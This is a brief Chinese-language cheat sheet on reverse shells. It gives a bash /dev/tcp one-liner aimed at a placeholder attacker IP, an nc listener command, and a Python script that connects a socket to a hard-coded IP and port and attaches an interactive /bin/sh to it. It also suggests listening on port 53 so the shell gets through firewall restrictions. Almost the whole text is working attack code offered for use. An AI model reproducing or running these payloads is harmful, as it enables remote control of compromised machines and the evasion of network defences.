# 反弹shell
### bash反弹
```
bash -i >& /dev/tcp/x.x.x.x/8888 0>&1
```
- 本地使用nc进行监听

```
nc -lvp 8888
```

### python反弹
```
#!/usr/bin/python
#-*- coding: utf-8 -*-
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.20.151",7777)) #更改localhost为自己的外网ip,端口任意
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```
个人觉得python反弹比较好用，有时bash反弹不是很好用

## 注意：有时候任意端口是不可取得，小技巧，我们监听一个其他服务端口，一般监听53端口，然后通过53端口进行反弹，测试可以成功。

详细参考链接：https://www.jianshu.com/p/9456473a0a14
